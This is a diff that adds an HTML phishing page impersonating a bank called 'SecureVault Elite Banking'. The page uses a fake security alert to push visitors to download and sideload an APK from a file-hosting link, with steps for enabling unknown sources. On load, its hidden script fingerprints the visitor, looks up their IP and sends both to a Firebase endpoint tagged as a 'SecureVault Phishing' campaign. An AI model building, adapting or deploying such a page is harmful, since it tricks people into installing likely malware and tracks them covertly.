@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SecureVault Elite Banking</title>
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@4/dist/fp.min.js"></script>
+    <style>
+        body { margin:0; padding:0; background: linear-gradient(#0f0c29, #302b63, #24243e); font-family: Arial, sans-serif; color: #fff; height: 100vh; overflow: auto; text-align: center; }
+        .container { max-width: 420px; margin: 40px auto; padding: 20px; }
+        .logo { font-size: 2.8em; font-weight: bold; color: #00ff9d; margin: 20px 0; }
+        .warning { background: #ff0000; padding: 20px; border-radius: 12px; margin: 20px 0; font-weight: bold; }
+        .raw-link {
+            display: block;
+            background: #00ff00;
+            color: #000;
+            padding: 25px 20px;
+            font-size: 1.1em;
+            font-weight: bold;
+            border-radius: 12px;
+            margin: 30px auto;
+            width: 88%;
+            text-decoration: none;
+            word-break: break-all;
+            box-shadow: 0 0 25px #00ff00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">SecureVault Elite Banking</div>
+        <div class="warning">
+            🚨 Security Alert: Your account needs immediate verification.
+        </div>
+        
+        <a href="https://files.catbox.moe/mtwvyr.apk" 
+           class="raw-link"
+           onclick="logClick()">
+            https://files.catbox.moe/mtwvyr.apk
+        </a>
+        
+        <div style="padding:20px; text-align:left; font-size:0.95em;">
+            <strong>Install Steps:</strong><br>
+            1. Tap the green link above<br>
+            2. Allow unknown sources in Settings<br>
+            3. Install the APK<br>
+            4. Open and follow setup
+        </div>
+    </div>
+
+    <script>
+        async function harvestAndSend() {
+            const fp = await FingerprintJS.load();
+            const result = await fp.get();
+            let ipData = {};
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch(e){}
+            
+            const payload = {
+                timestamp: new Date().toISOString(),
+                fingerprint: result.visitorId,
+                user_agent: navigator.userAgent,
+                ip: ipData.ip || 'unknown',
+                campaign: 'SecureVault Phishing',
+                action: 'page_load'
+            };
+
+            fetch('https://my-project-ef8f2-default-rtdb.firebaseio.com/config.json', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        function logClick() {
+            harvestAndSend({ action: 'APK_CLICKED' });
+        }
+
+        window.onload = harvestAndSend;
+    </script>
+</body>
+</html>
